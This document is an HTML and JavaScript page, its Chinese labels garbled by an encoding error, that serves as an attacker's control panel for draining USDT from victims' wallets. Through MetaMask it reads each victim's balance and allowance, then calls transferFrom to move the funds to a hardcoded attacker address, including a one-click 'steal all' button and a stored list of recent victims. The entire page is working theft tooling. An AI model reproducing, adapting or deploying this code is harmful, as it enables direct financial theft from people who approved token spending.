<!DOCTYPE html>
<html>
<head><meta charset="UTF-8"><title>ç›œå–æ§åˆ¶å° v2.6</title></head>
<body>
<h2>ğŸ› ï¸ æ”»æ“Šè€…æ“ä½œä»‹é¢</h2>
<div><b>ğŸ‘¤ ä½ ç›®å‰ç™»å…¥å¸³è™Ÿï¼š</b><span id="currentAccount" style="color:#007700;"></span></div>
<div><b>âš ï¸ èº«ä»½æª¢æŸ¥ï¼š</b><span id="checkStatus" style="font-weight:bold;"></span></div>
<br>
<input id="victim" placeholder="å—å®³è€…åœ°å€"><br>
<input id="amount" placeholder="é‡‘é¡ï¼ˆä¾‹ï¼š1000000 = 1 USDTï¼‰"><br>
<button onclick="getMax()">æŸ¥è©¢æœ€å¤§å¯ç›œé‡‘é¡</button>
<button onclick="steal()">åŸ·è¡Œç›œå–</button>
<button onclick="stealAll()">ä¸€éµç›œå…‰</button>

<h3>ğŸ§¾ æœ€è¿‘æˆæ¬Šåœ°å€åˆ—è¡¨ï¼š</h3>
<ul id="recentList" style="background:#f9f9f9;padding:10px;"></ul>
<button onclick="clearHistory()">ğŸ—‘ï¸ æ¸…é™¤è¨˜éŒ„</button>
<br><br>
<pre id="log" style="background:#f4f4f4;padding:10px;margin-top:20px;"></pre>

<script src="https://cdn.jsdelivr.net/npm/web3@1.10.0/dist/web3.min.js"></script>
<script>
const tokenAddress = "0xdAC17F958D2ee523a2206206994597C13D831ec7";
const attacker = "0xDa4FfA490992769B8F54063bf0B9E7a4D3479459";
const abi = [
  {
    "constant": true,
    "inputs": [{"name":"_owner","type":"address"}],
    "name": "balanceOf",
    "outputs": [{"name":"","type":"uint256"}],
    "type": "function"
  },
  {
    "constant": true,
    "inputs": [{"name":"_owner","type":"address"},{"name":"_spender","type":"address"}],
    "name": "allowance",
    "outputs": [{"name":"","type":"uint256"}],
    "type": "function"
  },
  {
    "constant": false,
    "inputs": [
      {"name":"_from","type":"address"},
      {"name":"_to","type":"address"},
      {"name":"_value","type":"uint256"}
    ],
    "name": "transferFrom",
    "outputs": [{"name":"","type":"bool"}],
    "type": "function"
  }
];

let web3, contract, account;

async function init() {
  if (typeof window.ethereum === 'undefined') {
    alert("è«‹å…ˆå®‰è£ MetaMask");
    return;
  }
  web3 = new Web3(window.ethereum);
  await ethereum.request({ method: 'eth_requestAccounts' });
  const accounts = await web3.eth.getAccounts();
  account = accounts[0];
  document.getElementById("currentAccount").innerText = account;
  contract = new web3.eth.Contract(abi, tokenAddress);
  const checkStatus = document.getElementById("checkStatus");
  checkStatus.innerText = account.toLowerCase() === attacker.toLowerCase()
    ? "âœ… ä½ æ˜¯æ”»æ“Šè€…æœ¬äºº"
    : "âŒ éæ”»æ“Šè€…å¸³è™Ÿï¼Œè«‹åˆ‡æ›";
}

async function getMax() {
  await init();
  const victim = document.getElementById("victim").value;
  if (!victim) return log("âŒ è«‹è¼¸å…¥å—å®³è€…åœ°å€");

  let balance = "0";
  let allowance = "0";
  try {
    balance = await contract.methods.balanceOf(victim).call();
    allowance = await contract.methods.allowance(victim, account).call();
  } catch (err) {
    log("âŒ æŸ¥è©¢å¤±æ•—ï¼Œå¯èƒ½å°šæœªæˆæ¬Šæˆ–åœ°å€éŒ¯èª¤");
    return;
  }
  const max = web3.utils.toBN(balance).lt(web3.utils.toBN(allowance)) ? balance : allowance;
  document.getElementById("amount").value = max;
  updateRecent(victim);
  log("ğŸŸ¢ å—å®³è€…ï¼š" + victim);
  log("âœ… å¯ç›œé‡‘é¡ï¼š" + max);
}

async function steal() {
  await init();
  const victim = document.getElementById("victim").value;
  const amount = document.getElementById("amount").value;
  try {
    const tx = await contract.methods.transferFrom(victim, attacker, amount).send({ from: account });
    const link = "https://etherscan.io/tx/" + tx.transactionHash;
    log("âœ… å·²åŸ·è¡Œ transferFrom(" + victim + " âœ " + attacker + ", " + amount + ")");
    log("âœ… å·²å¾ " + victim + " è½‰å‡º USDTï¼š" + amount);
    log("ğŸ”— TX Link: " + link);
  } catch (e) {
    log("âŒ è½‰å¸³å¤±æ•—ï¼š" + e.message);
  }
}

async function stealAll() {
  const lastVictim = getLastVictim();
  if (!lastVictim || lastVictim.toLowerCase() === attacker.toLowerCase()) {
    log("âŒ ç„¡æ³•ä¸€éµç›œå…‰ï¼šç„¡æœ‰æ•ˆå—å®³è€…åœ°å€æˆ–èˆ‡æ”»æ“Šè€…ç›¸åŒ");
    return;
  }
  await getMax();
  await steal(lastVictim);
}

function log(msg) {
  console.log(msg);
  document.getElementById("log").innerText += msg + "\n";
}

function updateRecent(victim) {
  if (!victim) return;
  let list = JSON.parse(localStorage.getItem("victimList") || "[]");
  const now = new Date().toLocaleString();
  const entry = victim + " â±ï¸ " + now;
  list = list.filter(i => !i.startsWith(victim));
  list.unshift(entry);
  if (list.length > 10) list.pop();
  localStorage.setItem("victimList", JSON.stringify(list));
  renderRecentList();
  document.getElementById("victim").value = victim;
}

function renderRecentList() {
  let list = JSON.parse(localStorage.getItem("victimList") || "[]");
  const container = document.getElementById("recentList");
  container.innerHTML = list.map(function(entry, i) {
    return '<li>' + (i + 1) + '. ' + entry + '</li>';
  }).join("");
  if (list.length > 0) {
    const last = list[0].split(" ")[0];
    document.getElementById("victim").value = last;
  }
}

function clearHistory() {
  localStorage.removeItem("victimList");
  renderRecentList();
}

window.addEventListener("load", renderRecentList);
</script>
</body>
</html>

<script>

function getLastVictim() {
  let list = JSON.parse(localStorage.getItem("victimList") || "[]");
  if (list.length === 0) return null;
  return list[0].split(" ")[0];
}

</script>